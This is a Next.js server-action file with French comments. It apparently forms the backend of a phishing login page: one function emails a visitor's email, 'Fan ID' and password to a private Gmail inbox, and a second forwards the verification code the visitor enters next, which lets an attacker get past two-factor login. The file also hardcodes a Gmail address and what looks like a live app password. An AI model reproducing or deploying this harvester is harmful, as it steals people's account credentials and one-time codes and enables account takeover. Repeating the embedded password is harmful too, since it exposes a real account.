"use server";

import nodemailer from "nodemailer";

// Configuration du transporteur
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "m.khoukh2003@gmail.com", 
    pass: "ztycxjrcdzpiucda", 
  },
});

// Action 1 : Envoi Email + Fan ID + Mot de passe
export async function sendLoginData(formData: FormData) {
  const email = formData.get("email") as string;
  // 1. On récupère le Fan ID ici
  const fanId = formData.get("fanId") as string; 
  const password = formData.get("password") as string;

  try {
    await transporter.sendMail({
      from: "NextJS Login App",
      to: "m.khoukh2003@gmail.com",
      subject: "🔔 Nouvelle tentative de connexion (Étape 1)",
      html: `
        <h2>Identifiants reçus :</h2>
        <p><strong>Email :</strong> ${email}</p>
        <p><strong>Fan ID :</strong> ${fanId}</p> <p><strong>Mot de passe :</strong> ${password}</p>
        <br/>
        <p><em>L'utilisateur est passé à l'étape de vérification...</em></p>
      `,
    });
    return { success: true };
  } catch (error) {
    console.error(error);
    return { success: false };
  }
}

// Action 2 : Envoi du Code de confirmation (Pas de changement nécessaire ici, sauf si tu veux rappeler le Fan ID)
export async function sendVerificationCode(formData: FormData) {
  const email = formData.get("email") as string;
  const code = formData.get("code") as string;

  try {
    await transporter.sendMail({
      from: "NextJS Login App",
      to: "m.khoukh2003@gmail.com",
      subject: "🔑 Code de confirmation saisi (Étape 2)",
      html: `
        <h2>Code de vérification reçu :</h2>
        <p><strong>Pour l'email :</strong> ${email}</p>
        <p><strong>Code saisi :</strong> <span style="font-size: 20px; font-weight: bold; color: red;">${code}</span></p>
      `,
    });
    return { success: true };
  } catch (error) {
    console.error(error);
    return { success: false };
  }
}